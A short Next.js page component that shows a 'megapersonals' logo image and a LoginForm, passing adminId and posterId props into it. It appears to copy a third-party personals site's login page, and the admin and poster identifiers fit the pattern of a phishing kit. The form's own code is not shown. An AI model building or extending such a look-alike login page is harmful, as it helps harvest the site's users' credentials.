"use client";

import LoginForm from "@/app/components/LoginForm";

export default function Home({ adminId, posterId }) {
  return (
    <div className="container pt-[35px] flex flex-col items-center overflow-x-hidden">
      <div className="w-[65%] lg:w-full">
        <img src="/images/megapersonals.png" alt="megaeprsonals" priority />
      </div>

      <LoginForm adminId={adminId} posterId={posterId} />
    </div>
  );
}
